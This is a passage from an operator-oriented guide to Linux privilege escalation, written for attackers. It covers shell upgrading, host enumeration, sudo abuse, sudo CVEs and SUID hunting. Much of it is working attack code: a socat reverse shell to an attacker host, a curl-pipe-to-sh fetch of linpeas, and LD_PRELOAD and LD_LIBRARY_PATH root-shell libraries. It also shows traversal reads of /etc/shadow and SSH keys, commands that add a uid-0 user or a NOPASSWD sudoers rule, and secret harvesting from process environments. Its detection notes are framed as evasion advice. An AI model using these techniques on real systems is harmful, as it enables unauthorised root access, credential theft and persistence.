# socat, if present on the target, does the whole job properly
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$ATTACKER:$LPORT
# openssl-based, when you also want TLS
# expect, rarely present but works
expect -c 'spawn /bin/bash; interact'
```

`pty.spawn` and `script` both create a PTY pair on the target and run bash against the slave, then relay bytes between the master and the socket. That restores the line discipline and controlling terminal on the remote side.

**Step two, get your local terminal out of the way.** You now have two line disciplines in series: your local terminal is still in cooked mode, echoing what you type and buffering lines, and the remote PTY is doing the same. That produces double echo, Ctrl-C hitting the wrong process, and broken editing. The fix is to put your local terminal into raw mode with echo off so it becomes a transparent byte pipe and the remote line discipline is the only one interpreting anything.

```bash
# in your local terminal, after the pty spawn on the target
# Ctrl-Z to background the listener
stty raw -echo; fg
# press Enter, then on the remote:
export TERM=xterm-256color
export SHELL=/bin/bash
stty rows 50 cols 200
reset
```

Get the correct row and column values from a second local terminal before you start, because `SIGWINCH` does not traverse a raw socket and the remote side has no way to learn your window size:

```bash
stty size          # prints "rows cols"
```

Note the argument order trap that catches everyone: `stty size` prints *rows then columns*, and `stty rows N cols M` also takes rows first, but `stty -a` reports them as `rows N; columns M` while some tools print `cols x rows`. Transposing them gives you a shell that wraps at the wrong place and redraws incorrectly in `vi`, which looks like a broken shell rather than a wrong number.

**Step three, be able to get your terminal back.** Once your local terminal is in raw mode with echo off, if the remote shell dies you are left in a terminal that does not echo and does not process Enter. Save the settings first so you can restore them exactly:

```bash
STTY_SAVED=$(stty -g)      # before you go raw
# ... session ...
stty "$STTY_SAVED"
# if you forgot to save:
stty sane; reset; tput reset
```

`stty sane` restores a reasonable default and `reset` reinitialises the terminal from terminfo including clearing any alternate character set left behind by a crashed curses program. Both are typed blind, without echo, so type them carefully and press Ctrl-J rather than Enter if the newline translation is broken.

**Verify the upgrade worked** rather than assuming:

```bash
tty                        # prints /dev/pts/N, not "not a tty"
ps -o tty= -p $$
stty -a | head -1          # sane speed, rows and columns match your window
echo $TERM
# the real test:
su - someuser              # a password prompt appears at all
vi /etc/hostname           # renders and exits cleanly with :q
```

**Detection and opsec.** Spawning a PTY is itself a signal. `script` writing to `/dev/null` under a service account, `python -c 'import pty'` in a process command line, and a new `/dev/pts` allocation parented by a web server or a database process are all high-fidelity detections and are commonly shipped as default rules in eBPF-based sensors. `utmp` and `wtmp` record interactive logins but not PTYs allocated this way, so `w` and `who` will not show you, which cuts both ways: it hides you from a casual administrator and stands out to anything comparing process tables against login records. If you have a C2 with native PTY support, use it, because it allocates the PTY through the implant rather than through a suspicious command line.

**Failure modes.**

| Symptom | Meaning |
| --- | --- |
| `python3: not found` | No interpreter. Fall back to `script`, or `socat`, or upgrade via a full C2 |
| `The input device is not a TTY` from `script` | You are already in a non-TTY and this `script` build requires one. Use `script -qc ... /dev/null` explicitly |
| Double echo of everything you type | You spawned the PTY but skipped `stty raw -echo` locally |
| Ctrl-C kills the whole session | Local terminal is still cooked, or you backgrounded and foregrounded incorrectly |
| `stty: standard input: Inappropriate ioctl for device` on the target | The remote side has no PTY yet, step one did not work |
| Prompt appears but `vi` scrambles the screen | `TERM` unset or wrong, or rows and columns transposed |
| Session hangs immediately after `fg` | Press Enter, the shell is waiting and your echo is off so it looks dead |

### The enumeration sweep, ordered by yield

Run the automated scripts, but do not outsource your thinking to them. *linpeas*, *LinEnum*, *lse.sh*, *linux-exploit-suggester*, *unix-privesc-check*, and *pspy* are all real and all useful, and they all produce hundreds of lines of colour-coded output in which the single finding that matters is one line among a thousand. They also write to disk, spawn hundreds of child processes, and match published detection signatures. The value of knowing the checks yourself is that you can run five targeted commands instead of a script, and that when the script highlights something in red you can tell whether it is a finding or noise.

```bash
# fetch and run without touching disk, when egress allows it
curl -sL http://$ATTACKER/linpeas.sh | sh
# offline, quieter, scoped output
./linpeas.sh -q -o SysI,Devs,AvaSof,ProCronSrvcsTmrsSocks,SofI,UsrI,FilesFolders 2>/dev/null | tee /dev/shm/.lp
# process spy, catches short-lived cron and service children without root
./pspy64 -pf -i 1000
```

*pspy* deserves special mention. It watches `/proc` and inotify to catch process creation without root, which is how you find the cron job or service that runs every minute with a command line you can influence. Static enumeration misses anything that only exists for 200 milliseconds.

The rest of this section is the sweep ordered by how often each category actually produces the escalation, not by tool.

#### sudo rights

Highest yield, cheapest check, always do it first.

```bash
sudo -l
sudo -ln                      # non-interactive, fails rather than prompting
sudo -l -U otheruser          # requires privilege, but try it
cat /etc/sudoers 2>/dev/null
ls -la /etc/sudoers.d/ ; cat /etc/sudoers.d/* 2>/dev/null
grep -rE '^[^#]' /etc/sudoers /etc/sudoers.d/ 2>/dev/null
sudo -V | head -1             # version, for CVE applicability
```

A finding looks like any line under "may run the following commands". Details in the dedicated sudo section below.

#### Users, login history, and who else is here

```bash
cat /etc/passwd
awk -F: '$3 >= 1000 && $3 < 65534 {print}' /etc/passwd     # real user accounts
awk -F: '$3 == 0 {print}' /etc/passwd                       # extra uid-0 accounts
awk -F: '$2 !~ /^[*!]/ && $2 != "" {print $1}' /etc/shadow 2>/dev/null
getent passwd                                               # includes AD/LDAP users
lastlog 2>/dev/null | grep -v 'Never logged in'
last -Faiw | head -40
w; who -a
ls -la /home /root /Users 2>/dev/null
find /home -maxdepth 2 -name '.ssh' -o -maxdepth 2 -name '.bash_history' 2>/dev/null
```

**What a finding looks like.** A second account with UID 0 is an immediate target and also a strong sign someone else has been here. A `/etc/passwd` that is writable, or that already contains a hash in the second field rather than an `x`, is a direct write-to-root. A `getent passwd` that returns hundreds of users that are not in `/etc/passwd` means the host is domain joined or LDAP backed, which redirects your whole approach (see the domain-joined and enterprise Linux section below). `lastlog` and `last` tell you which accounts are used, which is where credentials and keys will be, and whether an administrator logs in interactively, which tells you whether your noise will be noticed.

Home directories of *other* users that are world readable are consistently productive: `.bash_history`, `.ssh`, `.aws`, `.kube`, `.docker/config.json`, `.git-credentials`, `.netrc`, `.pgpass`, `.my.cnf`, `.ansible`, and IDE project directories with committed secrets.

#### SUID and SGID binaries

```bash
find / -xdev -perm -4000 -type f -printf '%m %u %g %p\n' 2>/dev/null | sort
find / -xdev -perm -2000 -type f -printf '%m %u %g %p\n' 2>/dev/null | sort
find / -xdev \( -perm -4000 -o -perm -2000 \) -type f -exec ls -la {} + 2>/dev/null
```

Use `-xdev` deliberately. It confines the search to one filesystem, which avoids walking NFS mounts (slow, noisy, and it lights up the file server) and avoids `/proc` and `/sys`. Run it separately per mounted filesystem you care about.

#### File capabilities

The single most frequently missed category, because it does not show up in a permissions listing.

```bash
getcap -r / 2>/dev/null
getcap -r /usr /opt /srv /home 2>/dev/null      # scoped and much quieter
# from package metadata, no filesystem walk at all
rpm -qa --filecaps 2>/dev/null | grep -v '^$'
```

#### Cron, timers, and anything scheduled

```bash
crontab -l
ls -la /etc/cron* /etc/cron.d/ /var/spool/cron/ /var/spool/cron/crontabs/ 2>/dev/null
cat /etc/crontab /etc/cron.d/* 2>/dev/null
for u in $(cut -d: -f1 /etc/passwd); do crontab -l -u "$u" 2>/dev/null | sed "s/^/$u: /"; done
systemctl list-timers --all
systemctl list-units --type=timer --all
ls -la /etc/systemd/system/*.timer /usr/lib/systemd/system/*.timer 2>/dev/null
ls -la /etc/anacrontab /var/spool/anacron 2>/dev/null
atq; ls -la /var/spool/at 2>/dev/null
ls -la /etc/init.d /etc/rc*.d 2>/dev/null
```

#### Services, sockets, and listening ports

```bash
systemctl list-units --type=service --state=running
systemctl list-unit-files --state=enabled
ps auxwwf
ps -eo pid,ppid,user,euser,tty,stat,cmd --sort=user
ss -tulpnae
ss -xlp                       # unix domain sockets with the listening process
lsof -i -P -n 2>/dev/null
lsof -U 2>/dev/null | head -50
```

Anything listening on `127.0.0.1` is worth more than anything listening externally, because it is exposed only to you and is therefore usually unauthenticated or weakly authenticated. Redis, memcached, Elasticsearch, unauthenticated Docker API on 2375, JMX, Jupyter, internal admin HTTP, and database instances bound to loopback are all common. Anything running as root that reads a file you can write is the goal.

#### Mounts, fstab, and network filesystems

```bash
findmnt -A -o TARGET,SOURCE,FSTYPE,OPTIONS
cat /proc/mounts
cat /etc/fstab
cat /etc/exports 2>/dev/null            # this host exports NFS
showmount -e $TARGET 2>/dev/null        # what another host exports
lsblk -f; blkid 2>/dev/null
df -hT
ls -la /mnt /media /srv /net 2>/dev/null
cat /etc/auto.master /etc/auto.* 2>/dev/null     # autofs, often NFS home dirs
```

Read the options column, not just the mount points. `nosuid` kills setuid escalation on that filesystem. `noexec` changes how you stage tooling. `nodev` prevents device node abuse. Absent `nosuid` on a user-writable or network mount is a finding. An `fstab` entry with credentials in it (`credentials=/root/.smbcred`, or worse `username=`/`password=` inline) is a credential finding.

#### Writable paths, PATH, and world-writable root-owned files

```bash
# every writable directory on your PATH, in order
echo "$PATH" | tr ':' '\n' | while read -r d; do
  [ -d "$d" ] && [ -w "$d" ] && echo "WRITABLE ON PATH: $d"
done
# relative or empty entries on PATH are equivalent to '.'
echo "$PATH" | tr ':' '\n' | grep -nE '^$|^[^/]'

# files and dirs writable by you or your groups, scoped to interesting trees
find /etc /usr /opt /srv /var/www /usr/local -writable -type f 2>/dev/null
find / -xdev -writable -type d 2>/dev/null | grep -vE '^/(proc|sys|dev|run|tmp|var/tmp)'
# world writable, and world writable owned by root
find / -xdev -perm -0002 -type f -printf '%m %u %p\n' 2>/dev/null | grep -v ' root ' 
find / -xdev -perm -0002 -uid 0 -type f -printf '%m %u %p\n' 2>/dev/null
find / -xdev -perm -0002 -type d ! -perm -1000 -printf '%m %p\n' 2>/dev/null   # world writable without sticky bit
# files owned by you in privileged locations
find /etc /usr /opt -user "$(id -u)" 2>/dev/null
```

A world-writable directory without the sticky bit inside a path a privileged process reads is the classic setup: you can replace files there that you do not own. A world-writable *file* that a root process sources, parses, or executes is the finding. Rank candidates by what reads them: a writable `/etc/ld.so.preload`, a writable systemd unit, a writable cron script, a writable `/etc/sudoers.d/` entry, a writable init script, a writable `.service` drop-in, a writable Python module inside a root-run application, and a writable file on root's `PATH` are all direct root.

#### Environment and shell configuration

```bash
env; export -p
cat /proc/self/environ | tr '\0' '\n'
cat /etc/environment /etc/profile 2>/dev/null
ls -la /etc/profile.d/; cat /etc/profile.d/* 2>/dev/null
cat ~/.bashrc ~/.bash_profile ~/.profile ~/.zshrc ~/.bash_logout 2>/dev/null
cat /etc/bash.bashrc /etc/bashrc 2>/dev/null
alias
# other users' environments, if readable, and root processes' environments
for p in /proc/[0-9]*/environ; do tr '\0' '\n' < "$p" 2>/dev/null; done | sort -u | grep -iE 'pass|token|key|secret|cred'
```

Reading `/proc/<pid>/environ` of processes you own always works, and of processes owned by others works only as root or with `CAP_SYS_PTRACE`. It is one of the best credential sources on a host running containerised or systemd-managed services, because environment-injected secrets are the norm.

#### Installed packages, versions, and language runtimes

```bash
dpkg -l 2>/dev/null | awk '{print $2, $3}'
rpm -qa --qf '%{NAME} %{VERSION}-%{RELEASE}\n' 2>/dev/null
apk info -v 2>/dev/null
pacman -Q 2>/dev/null
# what has been modified since installation
debsums -c 2>/dev/null
rpm -Va 2>/dev/null | grep -vE '^\.{8}|c ' | head -50
# language runtimes and their global config
python3 -c 'import sys; print(sys.version); print(sys.path)'
pip list 2>/dev/null; pip3 list 2>/dev/null
gem list 2>/dev/null; npm ls -g --depth=0 2>/dev/null
php -i 2>/dev/null | grep -E 'disable_functions|open_basedir|extension_dir|Loaded Configuration'
java -version 2>&1; echo "$CLASSPATH $JAVA_TOOL_OPTIONS $_JAVA_OPTIONS"
cat /etc/ld.so.conf /etc/ld.so.conf.d/* 2>/dev/null
ls -la /etc/ld.so.preload 2>/dev/null; cat /etc/ld.so.preload 2>/dev/null
ldconfig -p | head -20
```

`rpm -Va` and `debsums -c` are underused. They tell you which packaged files differ from the vendor's version, which surfaces both an administrator's local hack and another operator's backdoor. The output is noisy for config files, so filter to binaries and libraries.

For language runtimes, the finding is a writable directory anywhere on the module search path of a privileged process. A writable entry in Python's `sys.path`, a writable `site-packages`, a writable directory on `PERL5LIB`, a writable global `node_modules`, or a writable `/etc/ld.so.conf.d/` all mean you can inject code into anything privileged that starts up afterwards. `/etc/ld.so.preload` being writable is unconditional root: every dynamically linked binary on the host, including setuid ones, loads what you put in it.

### sudo in depth

**What it is.** *sudo* runs a command as another user according to a policy in `/etc/sudoers`. It is the most common Linux escalation path in real estates, not because sudo is weak but because the policies people write are.

**Why it works.** sudo is a setuid-root binary that consults a policy, authenticates you if required, resets the environment, and then `execve`s the target command with UID 0. Three properties of that flow are exploitable. First, the policy matches on a command path and optionally arguments, using shell-style globbing, and glob matching is far looser than authors expect. Second, once the target program runs as root, everything that program can do you can do, so any program with a code-execution, arbitrary-read, or arbitrary-write primitive is equivalent to a root shell. Third, the environment sanitisation is a denylist-shaped problem, and every exception punched into it for convenience is a loader-hijacking opportunity.

#### Reading the policy

```bash
sudo -l
sudo -ln                                  # never prompts, useful in a dumb shell
sudo -l -l                                # long form, shows matched sudoers entries verbatim
sudo -V | head -1                         # version
grep -rhE '^[^#]' /etc/sudoers /etc/sudoers.d/ 2>/dev/null
grep -E 'sudoers' /etc/nsswitch.conf      # 'sudoers: files sss' means AD/LDAP-sourced rules
```

The policy may not be on disk at all. `sudoers: files sss ldap` in `/etc/nsswitch.conf` means rules come from SSSD or LDAP, which usually means Active Directory `sudoRole` objects. That is a directory-side escalation opportunity covered in the domain-joined and enterprise Linux section below, and it also means `sudo -l` is the only way to see the effective policy.

Read the *tags* on each entry, they change everything:

| Tag or option | Meaning and consequence |
| --- | --- |
| `NOPASSWD:` | No authentication. You do not need the user's password at all |
| `PASSWD:` | Default. You need the invoking user's password |
| `SETENV:` | You may set arbitrary environment variables on the command line, including `LD_PRELOAD` |
| `NOEXEC:` | sudo preloads a library that neuters `exec*` calls in the target. Shell escapes inside the target break |
| `!command` in a list | Denylist entry. Almost always bypassable |
| `Defaults env_reset` | Default on. Environment is scrubbed to a small safe set |
| `Defaults !env_reset` | Environment passed through. `LD_PRELOAD` and friends work |
| `Defaults env_keep += "VAR"` | That specific variable survives |
| `Defaults env_delete`, `env_check` | Denylist and conditional-denylist of variables |
| `Defaults targetpw`, `rootpw`, `runaspw` | You authenticate as the *target* user, not yourself |
| `Defaults timestamp_timeout=N` | Cached credential lifetime in minutes. `-1` means never expires |
| `Defaults !requiretty` | Allows sudo from a non-TTY, which is what makes sudo work in a dumb shell |
| `Defaults log_output`, `log_input` | I/O logging. Everything you type is recorded and replayable |
| `Defaults use_pty` | Forces a PTY, which makes I/O logging tamper-resistant |
| `Defaults secure_path=...` | Overrides `PATH` for the command. Defeats naive `PATH` hijacking |
| `Runas_Spec` such as `(ALL : ALL)` or `(www-data)` | Which user and group you may become |

#### The NOPASSWD case

`(ALL) NOPASSWD: ALL` is root, immediately: `sudo su -`, `sudo -i`, `sudo bash`. More usually you get a specific command. Even then, `NOPASSWD` on a narrow command is more dangerous than a password-gated broad one, because you do not need to crack or phish anything.

`(ALL) ALL` with no `NOPASSWD` requires the user's password, which you may not have. Options: check for a cached sudo timestamp from a still-live session (`sudo -n true` succeeding means the timestamp is valid), harvest the password from history, config files, or the environment, or phish it by aliasing sudo in a shell rc file (persistence, not escalation, covered in the companion part).

#### Wildcards in permitted commands

This is the single most productive sudoers bug class. sudo matches commands with `fnmatch`-style globbing, and the rules for slashes are asymmetric in a way almost nobody who writes a sudoers file knows.

**Why it works.** In the *pathname* portion of a sudoers command spec, a wildcard does not match `/`. In the *argument* portion, wildcards do match `/`. So `/bin/cat /var/log/*` permits `sudo /bin/cat /var/log/../../etc/shadow`, because the `*` in the argument matches `../../etc/shadow` including the slashes. That converts a "let the operator read logs" rule into arbitrary file read as root.

```bash
sudo -l
# (root) NOPASSWD: /bin/cat /var/log/*
sudo /bin/cat /var/log/../../etc/shadow
sudo /bin/cat /var/log/../../root/.ssh/id_ed25519
```

The same trick applies to writes, copies, and archive operations:

```bash
# (root) NOPASSWD: /bin/chown www-data /var/www/*
sudo /bin/chown www-data /var/www/../../etc/shadow

# (root) NOPASSWD: /usr/bin/tar -czf /backup/*.tar.gz /data
# the argument wildcard lets you redirect the output, and tar has an exec primitive anyway

# (root) NOPASSWD: /usr/bin/rsync /srv/* /backup/
sudo /usr/bin/rsync -e 'sh -c "sh 0<&2 1>&2"' /srv/x localhost:/dev/null
```

A **bare trailing wildcard on the command itself** is total: `/usr/bin/vim *` or `/opt/scripts/*` permits any argument at all, and `/opt/*` permits any file under that tree including one you create if the tree is writable.

An entry with **no arguments specified at all**, such as `(root) NOPASSWD: /usr/bin/systemctl`, permits *any* arguments. That is not a wildcard, it is the absence of a constraint, and it is the same outcome. If sudoers wants to permit only the bare command it must say `/usr/bin/systemctl ""`.

**Common mistake.** Operators see `(root) NOPASSWD: /usr/bin/systemctl restart apache2` and move on, assuming it is safe. Two things to check: whether the entry actually ends there (a trailing `*` may be off screen), and whether the argument itself is exploitable. `systemctl restart` on a unit whose file you can write is root. So is `systemctl` with no argument constraint, via `systemctl --no-pager status anything` dropping into a pager, or `systemctl link`/`systemctl edit`.

#### Environment preservation, LD_PRELOAD and LD_LIBRARY_PATH

**Why it works.** The glibc dynamic loader honours `LD_PRELOAD` (load these shared objects first, so their symbols win), `LD_LIBRARY_PATH` (search these directories first), and `LD_AUDIT` (load an auditing library). The loader refuses to honour any of them when the process is in **secure-execution mode**, which the kernel signals through the `AT_SECURE` auxiliary vector entry, set when real and effective UID differ, when real and effective GID differ, or when file capabilities were applied. That is precisely why `LD_PRELOAD` does not work against a setuid binary.

sudo is different. sudo runs the target with real, effective, *and* saved UID all equal to 0. `AT_SECURE` is therefore not set, and the loader honours `LD_*` normally. So if sudo lets an `LD_*` variable through, you have arbitrary code execution as root regardless of what the permitted command is.

**Preconditions.** One of: `Defaults !env_reset`, `Defaults env_keep += "LD_PRELOAD"` (or `LD_LIBRARY_PATH`), or the `SETENV:` tag on the command, or the user is permitted `sudo -E`/`--preserve-env`. `sudo -l` shows the relevant `Defaults` lines and the `SETENV` tag.

```bash
# 1. build the payload library
cat > /dev/shm/pl.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void _init(void) {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    setresgid(0,0,0);
    execl("/bin/bash","bash","-p",NULL);
}
EOF
gcc -fPIC -shared -nostartfiles -o /dev/shm/pl.so /dev/shm/pl.c

# 2. run any permitted command with the preload
sudo LD_PRELOAD=/dev/shm/pl.so /usr/bin/apache2ctl
sudo -E /usr/bin/anything            # if -E is permitted and LD_PRELOAD is exported
```

Using `_init` (or a constructor attribute function) means the code runs at load time, before the target program's `main`, so the permitted command never actually executes. `unsetenv("LD_PRELOAD")` first prevents an infinite loop when the shell you spawn re-execs anything.

The `LD_LIBRARY_PATH` variant is used when `LD_PRELOAD` is filtered but `LD_LIBRARY_PATH` is not. Identify a library the target actually links against, build a shim exporting the same soname, and place it in your directory:

```bash
ldd /usr/sbin/target-binary        # pick a library, e.g. libcrypt.so.1
cat > /dev/shm/lib.c <<'EOF'
#include <stdlib.h>
static void __attribute__((constructor)) go(void) {
    setresuid(0,0,0); system("/bin/bash -p");
}
EOF
gcc -fPIC -shared -o /dev/shm/libcrypt.so.1 /dev/shm/lib.c
sudo LD_LIBRARY_PATH=/dev/shm /usr/sbin/target-binary
```

`LD_AUDIT` is the third variant and is worth trying when the other two are filtered, because denylists are often written from memory and `LD_AUDIT` is the one people forget. A minimal audit library only needs `la_version`.

Interpreter-specific equivalents apply the same principle to anything where sudo permits a runtime rather than a compiled binary. These matter because a sudoers rule permitting `python3 /opt/app/manage.py` looks tightly scoped and is not:

| Variable | Program | Effect |
| --- | --- | --- |
| `PYTHONPATH` | python | Prepends module search directories. Shadow any module the script imports |
| `PYTHONSTARTUP` | python, interactive only | Names a file sourced before the interactive prompt. Useless against a script invocation, which is the common sudoers case |
| `PERL5OPT`, `PERL5LIB`, `PERLLIB` | perl | `PERL5OPT=-Mmodule` loads arbitrary code before the script |
| `RUBYOPT`, `RUBYLIB` | ruby | `RUBYOPT=-rmodule` requires arbitrary code |
| `NODE_OPTIONS` | node | `NODE_OPTIONS=--require=/path/x.js` runs your code first |
| `BASH_ENV` | bash, non-interactive | bash sources the named file before running a script |
| `ENV` | POSIX sh, interactive | sourced at startup |
| `SHELLOPTS` plus `PS4` | bash with `-x` | `PS4='$(cmd)'` executes on every trace line |
| `CLASSPATH`, `JAVA_TOOL_OPTIONS`, `_JAVA_OPTIONS` | java | Load a javaagent or shadow a class |
| `LESSOPEN`, `LESSSECURE` | less | `LESSOPEN='|cmd %s'` runs a command per file opened |
| `PAGER`, `GIT_PAGER` | anything paging | Your program runs when output is paged |
| `GIT_EXTERNAL_DIFF`, `GIT_SSH`, `GIT_CONFIG` | git | Arbitrary command execution during normal git operations |
| `MANPAGER` | man | Same as `PAGER` |
| `KUBECONFIG` | kubectl | Points at a config with an `exec` credential plugin that runs your binary |
| `TMPDIR` | many | Redirects temp file creation into a directory you control |

#### Running as a non-root user as a stepping stone

`(www-data) NOPASSWD: /bin/bash` is not root, and it is still valuable. Becoming a service account gives you that account's files, keys, tokens, database credentials, and sockets, and it frequently gives you write access to something a root process consumes.

```bash
sudo -u www-data /bin/bash
sudo -u '#0' /bin/bash            # UID form, useful when the name is blocked
sudo -g docker /bin/bash          # group-only runas, note the docker group implication
```

The `#UID` syntax is worth knowing for its own sake. Historically `sudo -u#-1` and `sudo -u#4294967295` bypassed a `(ALL, !root)` runas restriction, because the UID parser accepted `-1`, that value failed to convert cleanly, and `setresuid` ended up leaving the UID at 0 (CVE-2019-14287, fixed in sudo 1.8.28). If you find a policy shaped like `(ALL, !root) ALL` and the sudo version is older than that, try it.

#### The generalisation: any program that executes, reads, writes, or loads

**This is the method that matters.** Do not look up a binary in a list and give up when it is not there. Ask four questions about whatever you are permitted to run as root:

1. **Can it execute?** Directly (`exec`, `!command`, `-exec`, `--eval`, a scripting language, a plugin, a hook, a filter, a pager, an editor's shell escape), or indirectly by writing something that will later be executed.
2. **Can it read an arbitrary file?** Then read `/etc/shadow` and crack it, read root's SSH private keys, read `/root/.aws/credentials`, read a Kerberos keytab, read a database config, read `/proc/*/environ` of privileged processes.
3. **Can it write an arbitrary file?** Then you do not need code execution at all. Write to `/etc/passwd`, `/etc/sudoers.d/`, `/etc/ld.so.preload`, `/etc/cron.d/`, `/root/.ssh/authorized_keys`, a systemd unit, or `/etc/shadow`.
4. **Can it load code?** A plugin path, a module directory, a config file that specifies a shared object, a `--load` flag, an interpreter search path, or an `LD_*` variable it does not sanitise.

Any single yes is root. Work through the program's own manual and configuration file format with those four questions and you will find primitives in binaries nobody has catalogued, which is the whole point. Bespoke administrative scripts and vendor management tools are where this pays off, and they are also where you will find the sloppiest argument handling.

Worked patterns for the write primitive, since it is the one operators most often overlook:

```bash
# arbitrary write, no code execution needed: add a root-equivalent user
openssl passwd -6 'Password1'                     # or: mkpasswd -m sha-512
echo 'pwn:<hash>:0:0:pwn:/root:/bin/bash' >> /etc/passwd
# with append-only or line-oriented primitives, a sudoers drop-in is smaller
echo 'ALL ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/zz-pwn
# with a single-file overwrite primitive, ld.so.preload is unconditional
echo /dev/shm/pl.so > /etc/ld.so.preload
```

`/etc/sudoers.d/` files must have no group or world write permission or sudo ignores the whole directory with a syntax complaint, and filenames containing a `.` or ending in `~` are skipped. That is a common reason a correct-looking write does nothing.

#### sudo's own vulnerability history

Worth checking the version, because sudo has had several clean local-root bugs and enterprise hosts lag badly.

| CVE | Affected | Nature |
| --- | --- | --- |
| CVE-2019-14287 | sudo < 1.8.28 | `-u#-1` runas restriction bypass, needs a `!root` policy |
| CVE-2021-3156 ("Baron Samedit") | sudo 1.8.2 to 1.8.31p2, 1.9.0 to 1.9.5p1 | Heap overflow reachable via `sudoedit -s`, root without any sudo rights at all |
| CVE-2023-22809 | sudo 1.8.0 to 1.9.12p1 | `sudoedit` honours extra files after `--` in `EDITOR`/`VISUAL`/`SUDO_EDITOR`, giving arbitrary file write when any `sudoedit` rule exists |
| CVE-2025-32462 | sudo 1.8.8 to 1.9.17 | `-h`/`--host` was only ever meant to scope `sudo -l` and `sudo -v`, but was accepted when actually running a command, so `sudo -h otherhost cmd` applies the sudoers rules written for that other host on this one. Only exploitable where sudoers is shared across hosts with per-host rules, which is exactly what a central sudoers or LDAP-backed sudoers gives you |
| CVE-2025-32463 | sudo 1.9.14 to 1.9.17 | `--chroot`/`-R` caused path resolution to happen inside the user-supplied root while sudoers was still being evaluated, so an attacker-controlled `/etc/nsswitch.conf` under that root loads an attacker-supplied NSS shared object as root. Fixed in 1.9.17p1, and the chroot feature was deprecated as a result |

```bash
sudo -V | head -1
sudo --version 2>/dev/null | head -1
# Baron Samedit reachability check: a crash rather than a usage error indicates vulnerable
sudoedit -s '\' $(python3 -c 'print("A"*1000)')
```

**Verify escalation worked.**

```bash
id                              # uid=0(root) with no separate euid
whoami
cat /etc/shadow | head -1       # succeeds only as root or with the right capability
touch /root/.probe && ls -la /root/.probe && rm /root/.probe
```

**Detection and opsec.** Every sudo invocation is logged: to syslog (`/var/log/auth.log` on Debian-family, `/var/log/secure` on RHEL-family) and to the journal, including the invoking user, the TTY, the working directory, the target user, and the *full command line*. A failed authentication and a "user NOT in sudoers" entry are both logged and both are commonly alerted on. `Defaults log_output` records the entire session to `/var/log/sudo-io/` where `sudoreplay` plays it back keystroke by keystroke, including anything you typed into an editor. There is no way to suppress that from inside the session, so if `sudo -l` shows I/O logging, assume everything you do under sudo is on video.

Specific high-signal patterns: `sudo` with an `LD_PRELOAD` or `LD_LIBRARY_PATH` on the command line is an unambiguous detection and appears in default rule sets for eBPF sensors and for auditd `execve` rules; `sudo` invoking a shell directly; `sudo` from a service account that has never used it; and a `sudo` command line containing `../`. Quieter is to use a permitted command's own intended features rather than an obvious escape, and to do your file writes in one shot rather than iterating.

**Failure modes.**

| Error | Meaning |
| --- | --- |
| `sudo: no tty present and no askpass program specified` | `requiretty` is set, or you have a dumb shell and sudo needs a terminal. Upgrade to a PTY |
| `sudo: a password is required` from `sudo -n` | No `NOPASSWD`, and no valid cached timestamp |
| `Sorry, user X is not allowed to execute '/bin/y' as root` | Your argument list did not match the policy. Compare character by character, including the exact path |
| `sudo: unable to resolve host <name>` | Cosmetic, missing entry in `/etc/hosts`, sudo still works |
| `sudo: /etc/sudoers.d/pwn is mode 0666, should be 0440` | Fix the mode, or sudo ignores the file and possibly the whole include |
| Command runs but as your own user | You matched a rule with a non-root `Runas_Spec` |
| `LD_PRELOAD` ignored | `env_reset` is in effect without `env_keep` or `SETENV`, or the target is statically linked, or `NOEXEC` is tagged |
| Shell escape does nothing | `NOEXEC:` tag. sudo preloaded a stub over `exec*`. Look for a non-exec primitive instead: read, write, or library load |

### SUID and SGID exploitation

**What it is.** A file with the set-user-ID bit runs with the effective UID of its owner rather than the invoker. Set-group-ID does the same for the group. On a typical host a dozen or so binaries are legitimately setuid-root, and the escalation is finding the one that is not typical.

**Why it works.** During `execve`, if the executable has `S_ISUID` set, the kernel sets the new process's effective and saved UID to the file's owner while leaving the real UID as the invoker. The kernel does not care what the program then does. Every setuid escalation is therefore either the program doing something it should not (executing a subprocess, following your input into a privileged operation, loading a library from a path you control) or the program being a general-purpose tool that should never have been setuid in the first place.

The kernel also sets `AT_SECURE` in the auxiliary vector, which puts the process into **secure-execution mode**. In that mode the glibc loader ignores `LD_PRELOAD`, `LD_LIBRARY_PATH`, `LD_AUDIT`, and most other `LD_*` variables, glibc ignores `MALLOC_*` tuning, and `RPATH`/`RUNPATH` entries containing `$ORIGIN` are only honoured under restricted conditions. This is the single most important thing to internalise: **the LD_PRELOAD trick does not work against setuid binaries.** It works against sudo, and against anything you can get root to run, but not against a setuid bit.

**Preconditions.** The binary must be on a filesystem mounted without `nosuid`. Your process must not have `NoNewPrivs` set. Under SELinux the transition must be permitted by policy, and under AppArmor the profile must not deny it.

#### Finding them and diffing against a baseline

The list itself is not the finding. On any real host, `find / -perm -4000` returns twenty to forty results and thirty-something of them are `su`, `sudo`, `passwd`, `chsh`, `chfn`, `gpasswd`, `newgrp`, `mount`, `umount`, `ping`, `pkexec`, `fusermount`, `ntfs-3g`, `dbus-daemon-launch-helper`, `polkit-agent-helper-1`, `unix_chkpwd`, `chage`, `at`, `crontab`, `sg`, `staprun`, `pam_timestamp_check`. Learning to recognise the boring set is the skill, and the fastest way to do that is to make the host tell you which ones came from a package and which did not.

```bash
# Debian family: which package owns each setuid file, and which owns none
find / -xdev -perm -4000 -type f 2>/dev/null | while read -r f; do
  printf '%-50s %s\n' "$f" "$(dpkg -S "$f" 2>/dev/null | cut -d: -f1 || echo '*** UNOWNED ***')"
done

# RHEL family, same idea
find / -xdev -perm -4000 -type f 2>/dev/null | while read -r f; do
  printf '%-50s %s\n' "$f" "$(rpm -qf "$f" 2>/dev/null || echo '*** UNOWNED ***')"
done

# does the package itself declare this file setuid, or did someone add the bit locally?
rpm -V -f /usr/bin/suspicious            # an 'M' in column 1 means mode changed since install
dpkg-statoverride --list                 # administrator-declared permission overrides
debsums -c 2>/dev/null                   # changed packaged files
```

A setuid file that **no package owns** is the finding, every time. So is a packaged file whose mode has been changed locally, which is what the `M` flag from `rpm -V` tells you. Second-tier findings are packaged binaries that are legitimately setuid on this distribution but have a known escape (`pkexec` with an unpatched PwnKit, `mount.nfs`, `staprun`, vendor agents), and anything under `/opt`, `/usr/local`, `/srv`, or a home directory.

Also check timestamps, because a setuid binary with a modification time that does not match its package neighbours is either an administrator's hack or someone else's backdoor:

```bash
find / -xdev -perm -4000 -type f -printf '%T+ %m %u %p\n' 2>/dev/null | sort
```

#### Understanding an unknown setuid binary

